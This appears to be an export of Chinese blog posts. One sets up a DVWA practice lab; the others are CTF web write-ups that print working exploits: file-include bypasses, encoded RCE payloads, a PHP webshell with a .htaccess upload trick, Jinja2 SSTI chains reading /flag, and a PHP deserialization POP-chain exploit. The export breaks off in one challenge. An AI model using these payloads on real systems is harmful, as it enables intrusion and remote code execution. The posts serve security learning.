[{"title":"web基础和靶场搭建","url":"/2022/12/12/web基础和靶场搭建/","content":"\n# Web安全\nWeb是互联网的总称，全称即World Wide Web， 缩写为WWW，全球广域网，也称为万维网，它是一种基于超文本和HTTP的、全球性的、动态交互的、跨平台的分布式图形信息系统。简单来说，Web是一种体系结构，通过它可以访问遍布于因特网主机上的连接文档。\nweb安全简单来说就是网站的安全，那么我们需要学习的是，网站上可能出现哪些漏洞（常见漏洞类型和原理），如何**寻找**这些漏洞，如何**利用**这些漏洞。本文可以作为“渗透：从0到1”的先导篇目。\n\n# 漏洞挖掘\n## 漏洞定义\n对于漏洞的官方定义：漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而使攻击者能在未授权的情况下访问或破坏系统。通俗的讲，只要可以给厂商带来损失的都可以被叫做漏洞。\n\n{% asset_img 漏洞挖掘.png 漏洞挖掘 %}\n\n## 漏洞类型(OWASP Top 10 2021 and part of Top 10 2017)\n|    |      |\n|:---:|:---|\n|A01 | 2021-失效的访问控制(Broken Access Control) |\n|A02 | 2021-加密机制失败(Cryptographic Failures) |\n|A03 | 2021-注入(Injection) |\n|A04 | 2021-不安全设计(Insecure Design) |\n|A05 | 2021-安全配置错误(Security Misconfiguration) |\n|A06 | 2021-自带缺陷和过时的组件(Vulnerable and Outdated Components) |\n|A07 | 2021-身份识别和身份验证错误(Identification and Authentication Failures) |\n|A08 | 2021-软件和数据完整性故障(Software and Data Integrity Failures) |\n|A09 | 2021-安全日志和监控故障(Security Logging and Monitoring Failures) |\n|A10 | 2021-服务端请求伪造(Sever-Side Request Forgery) |\n|A03|2017-敏感信息泄露(Sensitive Data Exposure)|\n|A07|2017-跨站脚本攻击(XSS)|\n|A08|2017-不安全的反序列化|\n|A09|2017-使用含有已知漏洞的组件|\n|A10|2017-不足的日志记录和监控|\n\n不难发现，许多CTF比赛的web题就是从这些漏洞中出题，因此必须对常见的漏洞进行具体细致的了解，这也是“挖洞”的基础。\n\n# 漏洞靶场之DVWA\nDVWA是OWASP官方编写的PHP网站，包含了各种网站常见漏洞，可以学习攻击及修复方式。关于靶场的搭建，可以用源码配合phpStudy小皮面板实现（市面上有许多种类的靶场，另一个我正在学习使用的就是pikachu），具体步骤可参考如下过程：\n## DVWA的安装\n>1 下载安装 phpStudy 和 DVWA源码\n\n可以根据需要，下载合适版本的phpStudy.\n\nphpStudy下载地址:[phpStudy](https://www.xp.cn/download.html)\n\n接下来获取DVWA靶场源代码.\n\nDVWA源代码下载地址1:[DVWA源码](https://github.com/digininja/DVWA/archive/master.zip)\n\nDVWA源代码下载地址2:[DVWA源码](https://github.com/ethicalhack3r/DVWA/archive/master.zip)\n\n>2 将解压后的DVWA源代码放置phpStudy的安装目录**WWW文件夹**中(有时需要修改源代码文件夹名dvwa-master为DVWA)\n\n>3 进入DVWA/config目录，将config.inc.php.dist中的dist删去\n\n>4 打开刚刚重命名的config.inc.php文件，修改db_user和db_password  //默认改为root root\n\n{% asset_img 修改配置实例.png 示例 %}\n\nDVWA在创建的时候需要在本地安装创建一个数据库(database)，也就意味着需要连接到本地已有的MySQL的数据库的软件，然后再用这个软件去创建一个DVWA的数据库。因此，其需要MySQL账号密码授权。这里我没有使用phpStudy的MySQL，而是使用本地自己安装的MySQL，用户名为root，密码为123@hui.\n如下图生成一个数据库\n\n{% asset_img database.png database示例 %}\n\n而对于phpStudy中集成的MySQL服务的账号密码默认为root和root，故若使用phpStudy中的MySQL，需要将修改db_user和db_password为root和root.\n\n\n>5 浏览器访问http://localhost/DVWA/setup.php, 点击最下方的Create Database.\n\n>6 浏览器访问http://localhost/DVWA/, 输入用户名admin，密码password，登录DVWA即可。\n\n## DVWA的使用\n在DVWA Security中可以手动调整靶机源码的安全级别，分别为 Low，Medium，High，Impossible，级别越高，安全防护越严格，渗透难度越大。一般 Low 级别基本没有做防护或者只是最简单的防护，很容易就能够渗透成功；而 Medium 会使用到一些非常粗糙的防护，需要使用者懂得如何去绕过防护措施；High 级别的防护则会大大提高防护级别，一般 High 级别的防护需要经验非常丰富才能成功渗透；最后 Impossible 基本是不可能渗透成功的，所以 Impossible 的源码一般可以被参考作为生产环境 Web 防护的最佳手段。\n\nDVWA 一共包含了十个攻击模块，分别是：Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、- File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。包含了 OWASP TOP10 的所有攻击漏洞的练习环境，一站式解决所有 Web 渗透的学习环境。\n\n# Docker基础\nDocker，即“容器”，便于环境的移植、安装和管理，并且具有很高的安全性。容易想象，如果用以上的办法部署DVWA靶场，当靶场被攻击时，本地将会是非常危险的。\n## 认识Docker\nDocker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的Linux或Windows操作系统的机器上，也可以实现虚拟化。容器是**完全使用沙箱机制，相互之间不会有任何接口**\n\n## Docker安装和配置\n这里在kali-linux-2022.1操作系统中进行Docker的安装和配置。\n### 查看系统信息和内核版本\n\n```\nuname -a  # 显示系统信息\nuname -v  # 显示内核版本\n```\n\n{% asset_img 版本内核.png 系统信息和内核版本 %}\n\n### 更换apt源\n默认的源在国外，我们通过这个源去下载时耗时将会很久，换源可以提高效率。\n\n```\nsudo vim /etc/apt/sources.list  # apt源路径: /etc/apt/sources.list\n```\n\n按`i`进入编辑模式，从以下国内源中选择一个复制进去然后按`esc`键输入`:wq`保存退出。\n\n```\n#中科大\ndeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\ndeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib\n#阿里云\n#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib\n#清华大学\n#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free\n#浙大\n#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free\n#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free\n#东软大学\n#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib\n#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib\n#重庆大学\n#deb http://http.kali.org/kali kali-rolling main non-free contrib\n#deb-src http://http.kali.org/kali kali-rolling main non-free contrib\n```\n\n感谢CSDN博主「卑微的那菈」整理的2022年全新kali国内源 [KALI更换国内源（2022年全新）](https://blog.csdn.net/fingue/article/details/127096363)\n\n这里我使用的是中科大的源\n\n{% asset_img 换源.png 换源 %}\n\n之后更新apt源即可。\n```\nsudo apt-get update\n```\n\n### Docker安装和验证\n```\nsudo apt-get install -y docker docker-compose   # 安装docker和docker-compose，-y表示默认全部yes\n``` \n\n待安装完成后，可用以下命令查看版本信息，以验证docker是否安装成功。\n```\ndocker --version # 查看版本\ndocker-compose --version # 查看版本\n```\n\n{% asset_img docker.png docker安装验证 %}\n\n### 启停管理\n```\nsudo systemctl start/stop/restart docker # 启动、停止、重启docker\n```\n\n通过以上命令即可以实现Docker的启停。\n### 配置加速器\n使用Docker的时候，需要经常从官方获取镜像，但是由于网络原因，拉取镜像的过程非常耗时，严重影响Docker的使用。因此可以通过配置加速器来解决。\n\n```\n# 添加一个daemon.json\nsudo vim /etc/docker/daemon.json\n# 将以下镜像注册copy进daemon.json中\n{ \"registry-mirrors\": [\n    \"https://dockerhub.azk8s.cn\",\n    \"https://reg-mirror.qiniu.com\",\n    \"https://1rqfztnd.mirror.aliyuncs.com\"\n  ]\n}\n```\n\n写入daemon.json文件后，下面使加速器生效。\n```\nsudo systemctl daemon-reload  # 重新加载配置文件\nsudo systemctl restart docker # 重启docker\n```\n\n## Docker安装、运行DVWA靶场\n```\nsudo docker search dvwa # 搜索DVWA\nsudo docker pull citizenstig/dvwa # 拉取安装指定dvwa\nsudo docker run --rm --name dvwa -it -p 8888:80 citizenstig/dvwa  # docker运行dvwa\nnetstat -ntulp | grep 8888  # 查看容器指定端口是否被打开\n访问 http://localhost:8888 进行dvwa的访问\n```\n\n>注：容器在运行时会生成一个镜像，镜像在生成后会处于几种状态：运行中和已停止，`--rm`命令使镜像在停止之后自动删除。需要保留镜像时就可以不加该参数；`--name dvwa`为镜像起名为dvwa；`-p`可理解为端口的映射，即把外部的8888端口映射镜像的80端口，通过访问外部8888端口，即可访问到80端口。\n\n{% asset_img re.png %}\n\n","tags":["web","渗透"],"categories":["渗透：从0到1"]},{"title":"2022Dest0g3 520迎新赛 web（1~5题）","url":"/2022/12/06/2022Dest0g3-520迎新赛-web（1-5题）/","content":"\n# phpdest\n\n放出源码：\n```\n<?php\nhighlight_file(__FILE__);\nrequire_once 'flag.php';\nif(isset($_GET['file'])) {\n    require_once($_GET['file']);\n}\n```\n\n这一次是对`require_once()`函数的考查，其调用时php会检查该文件是否已经被包含过，如果是则不会再次包含，于是我们必须想办法绕过这个机制，从而实现再次包含文件flag.php.\n\n上一次我们学习到php伪协议，结合下面这个知识点\n\n```\n/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接\n```\n\n我们就可以用伪协议配合多级符号链接的办法进行绕过，直接构造payload：\n\n```\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n```\n\nGET传参成功\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220824214540576-494053270.png\" width=500>\n转码后成功得到flag.\n`flag = \"Dest0g3{ef8f9913-9d91-4c88-9773-0810a40f8ad8}`\n[资料查阅：[require_once 绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235)]\n\n***\n\n# EasyPHP\n\n依旧给出源码：\n\n```\n<?php\nhighlight_file(__FILE__);\ninclude \"fl4g.php\";\n$dest0g3 = $_POST['ctf'];\n$time = date(\"H\");\n$timme = date(\"d\");\n$timmme = date(\"i\");\nif(($time > \"24\") or ($timme > \"31\") or ($timmme > \"60\")){\n    echo $fl4g;\n}else{\n    echo \"Try harder!\";\n}\nset_error_handler(\n    function() use(&$fl4g) {\n        print $fl4g;\n    }\n);\n$fl4g .= $dest0g3;\n?>\n```\n\n易知需要我们POST方式传入`ctf`，然后拼接在`$fl4g`后面，而输出`$fl4g`只能想办法触发`set_error_handler()`。\n\n这里我们利用`把数组当作字符串进行拼接运算时会报错`这一点\n\n```\nNotice:Array to string conversion\n//把数组当成了字符串使用，进行 .= 运算时，会自动根据环境需要转换数据类型（echo、print输出数组时也会报这样的信息）\n```\n\n把`ctf`用POST传入，即payload`ctf[]=1`\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825174531270-459754094.png\" width=500>\n\n成功获得flag.\n\n***\n\n# SimpleRCE\n\n源码给出：\n```\n<?php\nhighlight_file(__FILE__);\n$aaa=$_POST['aaa'];\n$black_list=array('^','.','`','>','<','=','\"','preg','&','|','%0','popen','char','decode','html','md5','{','}','post','get','file','ascii','eval','replace','assert','exec','$','include','var','pastre','print','tail','sed','pcre','flag','scan','decode','system','func','diff','ini_','passthru','pcntl','proc_open','+','cat','tac','more','sort','log','current','\\\\','cut','bash','nl','wget','vi','grep');\n$aaa = str_ireplace($black_list,\"hacker\",$aaa);\neval($aaa);\n?>\n```\n\n需要我们绕过`str_ireplace()函数(不区分大小写地对数组中所有元素进行搜索替换)`上传命令，从而实现RCE.\n\nⅠ、十六进制编码绕过\n由于过滤了`decode`，base64编码不能使用，我们想到十六进制转换后绕过。脚本如下：\n\n```\n<?php\n$a= \"system\";\n$b=\"cat *\";//命令\n\n$p='sysytem:'.bin2hex($a).'<br>command:'.bin2hex($b);\necho $p;\n?> \n\n//sysytem:73797374656d\n//command:636174202a\n```\n\n构造payload:`aaa=hex2bin('73797374656D')(hex2bin('636174202f2a'));//不加;不行`\n成功拿到flag.\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825191746040-258199898.png\" width=500>\n\nⅡ、无参RCE直接过\n看到的一种很牛的办法，不过还没有弄清原理。\npayload：\n\n```\nPOST：\naaa=show_source(next(apache_request_headers()));\nUser-Agent: /flag\n```\n\nⅢ、当然，还有其他绕过方法，如取反绕过：取反基本上用的都是一个不可见字符，不会触发到正则表达式。这里不再赘述，给出脚本：\n\n```\n<?php\n//在命令行中运行\n\n/*author yu22x*/\n\nfwrite(STDOUT,'[+]your function: ');\n\n$system=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); \n\nfwrite(STDOUT,'[+]your command: ');\n\n$command=str_replace(array(\"\\r\\n\", \"\\r\", \"\\n\"), \"\", fgets(STDIN)); \n\necho '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';\n\n```\n\n[资料查阅：[无字母数字绕过正则表达式总结](https://blog.csdn.net/miuzzx/article/details/109143413)]\n\n***\n\n# funny_upload\n\n查看页面源代码\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title></title>\n</head>\n<body>\n\n<script language=\"javascript\">\nfunction Checkfiles()\n{\nvar fup = document.getElementById('file');\nvar fileName = fup.value;\nvar ext = fileName.substring(fileName.lastIndexOf('.') + 1);\nif(ext == \"gif\" || ext == \"GIF\" || ext == \"JPEG\" || ext == \"jpeg\" || ext == \"jpg\" || ext == \"JPG\" || ext == \"png\" || ext == \"PNG\")\n{\nreturn true;\n}\nelse\n{\nalert(\"这个文件不好，我不喜欢\");\nreturn false;\n}\n}\n</script>\n<form method=\"post\" onsubmit=\"return Checkfiles()\" enctype=\"multipart/form-data\" >\n    <input type=\"file\" name=\"file\" id=\"file\">\n    <input  type=\"submit\" name=\"1\">\n</form>\n\n</body>\n</html>\n\n<script>alert('文件内容也改改呗~');</script>\n```\n\n可知前端对文件进行了绕过，且对文件内容也进行了过滤，尝试base64编码绕过：\n\n```\n<?php @eval($_POST[1]); ?>\nbase64编码——>\nPD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4=\n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825205743738-733807108.png\" width=500>\n\n上传成功！接下来的问题是，如何把这个上传的`.png`文件解析为`.php`文件。\n\n了解到`.htaccess文件(或者\"分布式配置文件\"）`\n> htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n\n其中`Addtype指令`可以将给定的文件拓展名映射到指定的内容类型：\n\n```\nAddType media-type extension [extension] ...\n \n示例：\nAddType application/x-httpd-php .gif\n \n将以 gif 为后缀的文件当做 php 解析\n\nAddType application/x-httpd-php png  jpg gif\n将以上的多个后缀都当作php解析。\n```\n\n并且，通过 `php_value` 来设置 `auto_prepend_file` 或者 `auto_append_file` 配置选项**包含**一些敏感文件，同时在本目录或子目录里**需要有可解析的php文件来触发**。\n\n结合以上两个指令，我们可以上传一个`.htaccess`文件：\n\n```\nAddtype application/x-httpd-php .jpg\n#将以 jpg 为后缀的文件当做 php 解析\n\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=webshell.jpg\"\n#配合php伪协议+包含“函数”实现文件执行 \n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825220347514-316795705.png\" width=500>\n\n修改请求包上传成功。\n\n按照路径打开webshell.jpg->当作php解析->触发`php_value auto_append_file`指令->执行源码\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825221309028-1614586059.png\" width=500>\n\n连接蚁剑，在根目录下找到Flag.\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825221608176-1984943651.png\" width=500>\n\n[查阅资料：[.htaccess的利用方法和技巧](https://blog.csdn.net/snowlyzz/article/details/126267637)]\n\n***\n\n# EasySSTI\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220825222602197-1595222581.png\" width=500>\n\n上来就让我们登录（截这张图完全因为background好看哈哈哈❤）\n\n根据题目名称提示，这题考察我们SSTI。补习了一些SSTI的知识后【[服务器端模板注入（SSTI）](https://www.cnblogs.com/ialoe/p/ssti.html)】，先用bp抓包，找注入点：\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916012811391-903505005.png\" width=200>\n发现在`username`处有jinja2模板引擎的SSTI漏洞。\n于是用`''.__class__`等进行简单测试，发现`_`，`'`，`\"`，` `，`[`都被过滤了，于是用`{{().request.args.class}}&class=__class__`尝试绕过，结果`request`也被过滤。（事实上`globals`，`getitem`，`os`，`read`，`popen`，`pop`也都被过滤，但是我还没有测出来）\n从其他师傅那里piao到小姿势：`{{config}}可以用来查看配置信息，通过这个或许能够构造出我要的payload`\n\n```\n&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;\n```\n\n找到`\\`，可以利用`config|string|list`获取以执行命令查看根目录......\n接续翻查资料了解到：\n\n```\n1. python下的数据拼接\njoin 方法 拼接字典，主要用于索引上的合并:默认按索引合并，可以合并相同或相似的索引，不管他们有没有重叠列\n\n2. {{()|select|string|list}}  or  {{lipsum|select|string|list}}     \n获取字符列表  \n\n3. {{lipsum.__globals__['os'].popen('ls').read()}}\n命令执行\n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916033307544-1063948328.png\" width=500>\n\n由此可以用诸如以下的方式构造我们需要的被“过滤”的关键字：\n\n```\n#构造po=\"pop\"     #利用dict()|join拼接得到\n{% set po=dict(po=a,p=a)|join%}\n \n#构造a=(()|select|string|list).pop(24),这里a即下划线_\n{% set a=(()|select|string|list)|attr(po)(24)%}\n \n#构造ini=\"__init__\"\n{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}\n \n#构造glo=\"__globals__\"\n{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}\n \n#构造geti=\"__getitem__\"\n{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}\n \n#构造built=\"__builtins__\"\n{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}\n \n#构造sub=\"__subclasses__\"\n{% set sub=(a,a,dict(subclasses=a)|join,a,a)|join()%}\n\n#构造chr()函数调用\n{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}\n{% set chr=x.chr%}\n\n#构造file='/flag'\n{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}\n```\n\n\n回到这一题，因为空格被过滤，可用`%0a`换行符绕过。命令执行payload构造过程：\n\n```\n{%set%0apo=dict(po=a,p=a)|join()%}                        #pop\n{%set%0aa=(()|select|string|list)|attr(po)(24)%}          #_\n{%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%}  #globals\n{%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%} #getitem\n{%set%0ape=dict(po=aaa,pen=aaa)|join()%}                  #popen\n{%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%}               #read\ndict(o=a,s=a)|join()                #获取 os\n(config|string|list)|attr(po)(279)  #获取  /\n\n\n{{lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()}}\n<==>\n{{lipsum.__globals__['os'].popen('ls').read()}}\n```\n\n成功构造payload：\n\n```\n{%set%0apo=dict(po=a,p=a)|join()%}{%set%0aa=(()|select|string|list)|attr(po)(24)%}{%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%}{%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%}{%set%0ape=dict(po=aaa,pen=aaa)|join()%}{%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%}{{lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(dict(l=a,s=a)|join())|attr(re)()}}\n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202209/2933309-20220916165007009-950366739.png\">\n\n修改payload，将`ls`改为`ls /`，上述dict拼接办法不能用（也可能是我操作有问题），直接`()|select|string|list`一个个获取：\n\n```\n((()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(18),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279))|join()\n```\n\n发现flag后按照上述办法将命令修改为`cat /flag`：\n\n```\n((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join()\n```\n\n成功获取FLAG，最后给出最终完整的Payload：\n\n```\n{%set%0apo=dict(po=a,p=a)|join()%}{%set%0aa=(()|select|string|list)|attr(po)(24)%}{%set%0aglo=(a,a,dict(glo=aa,bals=aa)|join,a,a)|join()%}{%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%}{%set%0ape=dict(po=aaa,pen=aaa)|join()%}{%set%0are=dict(rea=aaaaa,d=aaaaa)|join()%}{{lipsum|attr(glo)|attr(geti)(dict(o=a,s=a)|join())|attr(pe)(((()|select|string|list)|attr(po)(15),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(16),(()|select|string|list)|attr(po)(10),(config|string|list)|attr(po)(279),(()|select|string|list)|attr(po)(41),(()|select|string|list)|attr(po)(20),(()|select|string|list)|attr(po)(6),(()|select|string|list)|attr(po)(1))|join())|attr(re)()}}\n```","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"2022DASCTF X SU 三月春季挑战赛 web","url":"/2022/12/06/2022DASCTF-X-SU-三月春季挑战赛-web/","content":"\n# ezpop\n给出了源码：\n```\n<?php\n\nclass crow\n{\n    public $v1;\n    public $v2;\n\n    function eval() {\n        echo new $this->v1($this->v2);\n    }\n\n    public function __invoke()\n    {\n        $this->v1->world();\n    }\n}\n\nclass fin\n{\n    public $f1;\n\n    public function __destruct()\n    {\n        echo $this->f1 . '114514';\n    }\n\n    public function run()\n    {\n        ($this->f1)();\n    }\n\n    public function __call($a, $b)\n    {\n        echo $this->f1->get_flag();\n    }\n\n}\n\nclass what\n{\n    public $a;\n\n    public function __toString()\n    {\n        $this->a->run();\n        return 'hello';\n    }\n}\nclass mix\n{\n    public $m1;\n\n    public function run()\n    {\n        ($this->m1)();\n    }\n\n    public function get_flag()\n    {\n        eval('#' . $this->m1);\n    }\n\n}\n\nif (isset($_POST['cmd'])) {\n    unserialize($_POST['cmd']);\n} else {\n    highlight_file(__FILE__);\n}\n?>\n```\n\n显然，这是要我们找到一条POP链。\n我们从目的出发，找到可以利用的函数`eval()`——可以将字符串按照php代码来计算。如果传入`system()`函数调用外部命令实现rce，就有可能找到flag。\n可以明确用`mix::get_flag()`函数触发`eval()`，那么，如何触发`mix::get_flag()`：\n1、通过`mix::run（）`触发，但这样会限制$m1为\"get_flag\"，从而无法利用`eval()`执行命令，行不通；\n2、通过`fin::__call($a, $b)`触发，将mix传入fin的`$f1`即可，可行。\n接下来，如何触发`fin::__call($a, $b)`成了问题，目前就只形成了这样的链子\n`fin::__call() --> mix::get_flag()`\n倒推困难，我们就找入口正推。这里注意到这样几个魔术方法\n\n```\n__destruct()  //当对象被销毁时触发\n__toString()  //当把类当作字符串使用时触发\n__invoke()    //当对象调用为函数时触发\n__call()      //当对象上下文中调用不可访问的方法时触发\n```\n\n而`fin::_destruct()`恰好可以用来触发`what::_toString()`，从而可以触发`run()`，继而再触发一个函数，如果触发`_invoke()`，由于`world()`不可访问，就可以用之触发`_call()`，从而形成完整的POP链：\n\n```fin::__destruct() --> what::__toString() --> fin::run() --> crow::__invoke() --> fin::__call() --> mix::get_flag()```\n\n（这里用的`fin::run()`，另一个似乎也可以）。\n\n另一个需要注意的点是：`eval()`用'#'进行了过滤，因此还需要绕过，这里可以选用`?>`闭合，也可以选用`\\n`换行符！\n构造exp如下：\n\n```\n<?php\n\nclass crow\n{\n    public $v1;\n    public $v2;\n\n    function eval() {\n        echo new $this->v1($this->v2);\n    }\n\n    public function __invoke()\n    {\n        $this->v1->world();\n    }\n}\n\nclass fin\n{\n    public $f1;\n\n    public function __destruct()\n    {\n        echo $this->f1 . '114514';\n    }\n\n    public function run()\n    {\n        ($this->f1)();\n    }\n\n    public function __call($a, $b)\n    {\n        echo $this->f1->get_flag();\n    }\n\n}\n\nclass what\n{\n    public $a;\n\n    public function __toString()\n    {\n        $this->a->run();\n        return 'hello';\n    }\n}\nclass mix\n{\n    public $m1;\n\n    public function run()\n    {\n        ($this->m1)();\n    }\n\n    public function get_flag()\n    {\n        eval('#' . $this->m1);\n    }\n\n}\n\n//fin::__destruct() --> what::__toString() --> fin::run() --> crow::__invoke() --> fin::__call() --> mix::get_flag()\n\n$a=new fin();//为了调用__destruct()方法\n$b=new fin();\n//$b=new mix;\n$c=new fin();\n$d=new crow();\n$e=new what();\n$f=new mix();\n\n$a->f1=$e;//为了调用__toString()方法\n$e->a=$b;//为了去调用run方法\n$b->f1=$d;//为了去调用__invoke()方法\n$d->v1=$c;//为了去调用__call()方法\n$c->f1=$f;//为了去调用get_flag()方法 \n$f->m1=\"\\nsystem('ls /');\" ;//用 \\n 绕过注释符\n\necho urlencode(serialize($a));\n?>\n```\n得到`O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A16%3A%22%0Asystem%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D`\n\n最后用bp传参即可（这里用`ls /`命令查根目录较麻烦，于是用`ls`查当前目录，也不很好找，最后选择用`cat *`查看所有文件，结果如下图）\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220822003739417-1945498056.png\" width=500>\n成功找到flag！\n\n***\n该题在构造pop链上思路不算混乱（可能跟我偷看了一眼wp有关），但是在传参上遇到了很大的问题，一方面HackBar（估计是HB自身问题）总是失败搞人心态，另一方面用burp suite发送POST请求的方法没有掌握，即有三个地方需要修改：\n1、GET修改为POST方法\n2、加上媒体类型信息：Content-Type: application/x-www-form-urlencoded\n3、末尾添加需上传语句：cmd=xxxx\n***\n\n另外有师傅在构造exp时传入`\"?><? @eval(\\$_POST[b]);\"`，继而利用蚁剑连接找flag，但是博主尚未弄清蚁剑🗡的这一功能，待研究后更新。\n详情请访问这位师傅的Blog[【2022DASCTF X SU】 三月春季挑战赛 web复现](https://blog.csdn.net/qq_51295677/article/details/124283836?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-124283836-blog-123774410.t0_layer_searchtargeting_sa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1-124283836-blog-123774410.t0_layer_searchtargeting_sa&utm_relevant_index=2)\n\n# calc\n题目上来就给个计算器，打开源码，发现是用python写的计算器。源码放在下面：\n```\n#coding=utf-8\nfrom flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory\nimport random\nfrom urllib import parse\nimport os\nfrom werkzeug.utils import secure_filename\nimport 